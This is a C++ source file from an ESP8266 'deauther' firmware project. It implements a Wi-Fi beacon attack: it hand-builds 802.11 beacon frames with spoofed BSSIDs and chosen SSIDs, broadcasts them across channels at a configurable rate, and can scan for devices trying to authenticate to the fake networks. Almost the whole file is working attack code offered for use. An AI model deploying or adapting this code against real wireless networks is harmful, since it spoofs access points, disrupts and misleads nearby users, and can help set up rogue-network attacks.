/*
   Copyright (c) 2020 Stefan Kremser (@Spacehuhn)
   This software is licensed under the MIT License. See the license file for details.
   Source: github.com/spacehuhn/esp8266_deauther
 */

#pragma once

// ========== BEACON PACKET ========== //
const uint8_t beacon_pkt[] = {
    // [22]
    /*  0 - 3  */ 0x80, 0x00, 0x00, 0x00,                         // Type/Subtype: managment beacon frame
    /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,             // Destination MAC
    /* 10 - 15 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC
    /* 16 - 21 */ 0x01, 0x02, 0x03, 0x04, 0x05, 0x06,             // Source MAC

    // Fixed parameters [14]
    /* 22 - 23 */ 0x00, 0x00,                                     // Fragment & sequence number (handled by the SDK)
    /* 24 - 31 */ 0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, // Timestamp
    /* 32 - 33 */ 0xe8, 0x03,                                     // Interval: [0x64, 0x00] => 100ms, [0xe8, 0x03] => 1s
    /* 34 - 35 */ 0x31, 0x00,                                     // Capabilities Tnformation 0x21 = OPEN, 0x31 = ENCRYPTED

    // Tagged parameters

    // SSID parameters [2+ssid]
    /* 36 - 37 */ 0x00, 0x20,             // Tag: Set SSID length, Tag length: 32
    /* 38 -    */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*         */ 0x00, 0x00, 0x00, 0x00, // SSID
    /*    - 69 */ 0x00, 0x00, 0x00, 0x00, // SSID

    // Supported Rates [10]
    /* 70 - 71 */ 0x01, 0x08,             // Tag: Supported Rates, Tag length: 8
    /*    72   */ 0x82,                   // 1(B)
    /*    73   */ 0x84,                   // 2(B)
    /*    74   */ 0x8b,                   // 5.5(B)
    /*    75   */ 0x96,                   // 11(B)
    /*    76   */ 0x24,                   // 18
    /*    77   */ 0x30,                   // 24
    /*    78   */ 0x48,                   // 36
    /*    79   */ 0x6c,                   // 54

    // Current Channel [3]
    /* 80 - 81 */ 0x03, 0x01,             // Channel set, length
    /*    82   */ 0x01,                   // Current Channel

    // RSN information
    /* 83 - 84 */ 0x30, 0x18,
    /* 85 - 86 */ 0x01, 0x00,
    /* 87 - 90 */ 0x00, 0x0f, 0xac, 0x02,
    /* 91 - 92 */ 0x02, 0x00,
    /* 93 -100 */ 0x00, 0x0f, 0xac, 0x04, 0x00, 0x0f, 0xac, 0x04,
    /*101 -102 */ 0x01, 0x00,
    /*103 -106 */ 0x00, 0x0f, 0xac, 0x02,
    /*107 -108 */ 0x00, 0x00
};

// ========== ATTACK DATA ========== //
typedef struct beacon_attack_data_t {
    bool enabled;

    beacon_attack_settings_t settings;

    unsigned long start_time;
    unsigned long output_time;
    unsigned long pkts_sent;
    unsigned long pkts_per_second;
    unsigned long pkt_time;
    unsigned long pkt_interval;
} beacon_attack_data_t;

beacon_attack_data_t beacon_data;

// ========== SEND FUNCTION ========== //
bool send_beacon(uint8_t ch, uint8_t* bssid, uint8_t* receiver, const char* ssid, int enc) {
    size_t ssid_len = strlen(ssid);

    if (ssid_len > 32) ssid_len = 32;
    uint16_t pkt_len = 0;

    uint8_t frame[109];

    // MAC header
    memcpy(&frame[0], &beacon_pkt[0], 4);
    memcpy(&frame[4], receiver, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    pkt_len += 4 + 6 + 6 + 6;

    // Fixed parameters
    memcpy(&frame[22], &beacon_pkt[22], 14);
    pkt_len += 14;

    // SSID
    frame[pkt_len]   = 0x00;
    frame[pkt_len+1] = ssid_len;
    memcpy(&frame[pkt_len+2], ssid, ssid_len);
    pkt_len += 2 + ssid_len;

    // Supported Rates
    memcpy(&frame[pkt_len], &beacon_pkt[70], 10);
    pkt_len += 10;

    // Channel
    memcpy(&frame[pkt_len], &beacon_pkt[80], 2);
    frame[pkt_len+2] = ch;
    pkt_len         += 2+ 1;

    // RSN
    switch (enc) {
        case ENCRYPTION_OPEN:
            frame[34] = 0x21;
            return sysh::send(ch, frame, pkt_len);
        case ENCRYPTION_WPA2:
            frame[34] = 0x31;

            memcpy(&frame[pkt_len], &beacon_pkt[83], 26);
            pkt_len += 26;

            return sysh::send(ch, frame, pkt_len);
        default:
            return false;
    }
}

// ========== ATTACK FUNCTIONS ========== //
void startBeacon(const beacon_attack_settings_t& settings) {
    { // Error checks
        if (settings.ssids.empty()) {
            debuglnF("ERROR: No SSIDs specified");
            return;
        }
        if ((settings.channels & 0x3FFF) == 0) {
            debuglnF("ERROR: No channel specified");
            return;
        }
    }

    stopBeacon();

    unsigned long current_time = millis();

    beacon_data.enabled  = true;
    beacon_data.settings = settings;
    if (beacon_data.settings.pkt_rate == 0) beacon_data.settings.pkt_rate = 1;
    beacon_data.start_time      = current_time;
    beacon_data.output_time     = current_time;
    beacon_data.pkts_sent       = 0;
    beacon_data.pkts_per_second = 0;
    beacon_data.pkt_time        = current_time;
    beacon_data.pkt_interval    = 1000/beacon_data.settings.pkt_rate;

    { // Output
        debuglnF("[ ===== Beacon Attack ===== ]");

        debugF("BSSID:               ");
        debugln(strh::mac(beacon_data.settings.bssid));

        debugF("Receiver:            ");
        debugln(strh::mac(beacon_data.settings.receiver));

        debugF("Channels:            ");
        debugln(strh::channels(beacon_data.settings.channels));

        debugF("Packets/s per SSID:  ");
        debugln(beacon_data.settings.pkt_rate);

        debugF("Encryption:          ");

        switch (beacon_data.settings.enc) {
            case ENCRYPTION_OPEN:
                debuglnF("none (open)");
                break;
            case ENCRYPTION_WPA2:
                debuglnF("WPA2");
                break;
        }

        debugF("Timeout:             ");
        if (beacon_data.settings.timeout > 0) debugln(strh::time(beacon_data.settings.timeout));
        else debuglnF("-");

        debugF("Authentication Scan: ");
        debugln(beacon_data.settings.scan ? F("On") : F("Off"));

        debugF("SSIDs:               ");
        debugln(beacon_data.settings.ssids.size());

        debugln();

        debuglnF("SSID                               BSSID");
        debuglnF("====================================================");

        uint8_t bssid[6];
        memcpy(bssid, beacon_data.settings.bssid, 6);

        beacon_data.settings.ssids.begin();

        while (beacon_data.settings.ssids.available()) {
            debug(strh::left(34, '"' + beacon_data.settings.ssids.iterate() + '"'));
            debug(' ');
            debugln(strh::mac(bssid));
            bssid[5]++;
        }

        debuglnF("====================================================");

        debugln();
        debuglnF("Type 'stop beacon' receiver stop the attack");
        debugln();
    }

    if (beacon_data.settings.scan) {
        auth_scan_settings_t auth_settings;

        auth_settings.channels = beacon_data.settings.channels;
        auth_settings.ch_time  = 1000/beacon_data.settings.pkt_rate;
        auth_settings.timeout  = beacon_data.settings.timeout;
        auth_settings.beacon   = true;
        auth_settings.save     = beacon_data.settings.save_scan;

        scan::startAuth(auth_settings);
    }
}

void stopBeacon() {
    if (beacon_data.enabled) {
        if (beacon_data.settings.scan) {
            scan::stopAuth();
        }

        beacon_data.pkts_sent += beacon_data.pkts_per_second;
        beacon_data.enabled    = false;
        beacon_data.settings.ssids.clear();

        debugF("> Stopped beacon attack. Sent ");
        debug(beacon_data.pkts_sent);
        debuglnF(" packets.");
    }
}

void update_beacon_attack() {
    if (beacon_data.enabled) {
        if (((beacon_data.settings.timeout > 0) && (millis() - beacon_data.start_time > beacon_data.settings.timeout))) {
            stopBeacon();
            return;
        }

        if (millis() - beacon_data.output_time >= 1000) {
            beacon_data.pkts_sent += beacon_data.pkts_per_second;

            /*
               debugF("[Beacon attack: ");
               debug(beacon_data.pkts_per_second);
               debugF(" pkts/s, ");
               debug(beacon_data.pkts_sent);
               debuglnF(" total]");
             */
            beacon_data.output_time = millis();

            beacon_data.pkts_per_second = 0;
        }

        if (millis() - beacon_data.pkt_time >= beacon_data.pkt_interval) {
            beacon_data.pkt_time = millis();
            beacon_data.settings.ssids.begin();

            uint8_t ch = sysh::next_ch(beacon_data.settings.channels);

            uint8_t bssid[6];
            memcpy(bssid, beacon_data.settings.bssid, 6);

            for (int i = 0; i<beacon_data.settings.ssids.size(); ++i) {
                String ssid = beacon_data.settings.ssids.iterate();

                beacon_data.pkts_per_second += send_beacon(ch,
                                                           bssid,
                                                           beacon_data.settings.receiver,
                                                           ssid.c_str(),
                                                           beacon_data.settings.enc);
                delay(1);

                bssid[5]++;
            }
        }
    }
}

bool beaconBSSID(uint8_t* bssid) {
    return (beacon_data.enabled) && (memcmp(bssid, beacon_data.settings.bssid, 5) == 0);
}

String getBeacon(uint8_t num) {
    return beacon_data.settings.ssids.get(num - beacon_data.settings.bssid[5]);
}

bool beacon_active() {
    return beacon_data.enabled;
}